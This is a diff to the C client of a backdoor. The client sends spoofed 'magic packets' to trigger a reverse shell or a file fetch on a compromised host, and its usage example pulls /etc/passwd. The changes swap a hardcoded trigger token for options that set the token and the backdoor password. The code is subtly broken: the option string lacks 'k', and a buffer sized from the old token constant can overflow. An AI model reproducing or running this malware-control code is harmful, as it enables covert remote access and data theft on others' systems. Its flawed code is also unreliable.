@@ -28,15 +28,11 @@
 #include "config.h"
 #include "pel.h"
 
-#define ERROR	-1
-#define SRCPORT	666
-#define TCPPORT	80
-#define UDPPORT	53
-#define TOKEN	"F0rb1dd3n"
-
 unsigned char message[BUFSIZE + 1];
 extern char *optarg;
 extern int optind;
+char *secret = PASS;
+char *token = TOKEN;
 
 int sockfd;
 pid_t pid;
@@ -571,9 +567,11 @@ void usage(char *argv){
 	printf("-x\tMagic Packet protocol (ICMP/UDP/TCP) or just \"listen\"\n");
 	printf("-s\tSource IP address if you wanna spoof\n");
 	printf("-l\tLocal host to reverse shell\n");
-	printf("-p\tLocal port to reverse shell\"\n\n");
+	printf("-p\tLocal port to reverse shell\n");
+	printf("-k\tToken to trigger the port-knocking\n");
+	printf("-w\tPassword for backdoor auth\n\n");
 	printf("%s ICMP doesn't need ports\n\n", warn);
-	printf("Example: %s -t 192.168.0.3 -x tcp -s 192.168.0.2 -l 192.168.0.4 -p 4444\n", argv);
+	printf("Example: %s -t 192.168.0.3 -x tcp -s 192.168.0.2 -l 192.168.0.4 -p 4444 -w s3cr3t -k hax0r\n", argv);
 	printf("Example: %s -t 192.168.0.3 -a \"get /etc/passwd /tmp\" -x udp -l 192.168.0.4 -p 4444\"\n\n", argv);
 	exit(1);
 }
@@ -587,7 +585,7 @@ int main(int argc, char **argv) {
 
         lhost = lport = src_file = dst_dir = srcip = dstip = prot = buf = cmd = data = NULL;
  
-        while((opt = getopt(argc, argv, "a:s:t:l:p:x:")) != EOF) {
+        while((opt = getopt(argc, argv, "a:s:t:l:p:x:w:")) != EOF) {
                 switch(opt) {
                         case 'x':
                                 prot = optarg;
@@ -645,6 +643,12 @@ int main(int argc, char **argv) {
 					cmd = optarg;
 				}
 				break;
+			case 'w':
+				secret = optarg;
+				break;
+			case 'k':
+				token = optarg;
+				break;
                         default: 
                                 usage(argv[0]);
                                 break;
@@ -665,7 +669,8 @@ int main(int argc, char **argv) {
 
 	if(strcmp(prot, "listen")) {
 		data = (char *) malloc(strlen(TOKEN) + strlen(lhost) + strlen(lport) + 4);
-		strcpy(data, TOKEN " ");
+		strcpy(data, token);
+		strcat(data, " ");
 		strcat(data, lhost);
 		strcat(data, " ");
 		strcat(data, lport);
@@ -688,9 +693,8 @@ int main(int argc, char **argv) {
 
 	if(pid > 0) {
 		signal(SIGQUIT, SIG_DFL);
-connect:
-		if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) fatal("in socket");
 
+		if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) fatal("in socket");
 		if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) fatal("setting socket option SO_REUSEADDR");
 
 		signal(SIGTERM, handle_shutdown);
@@ -723,9 +727,8 @@ connect:
 
         		if(ret != PEL_SUCCESS) {
             			close(new_sockfd);
-
-            			password = getpass("Password: ");
-            			goto connect;
+				printf("%s wrong password!\n\n", bad);
+            			exit(ERROR);
         		}
     		} else {
         		ret = pel_client_init(new_sockfd, password);
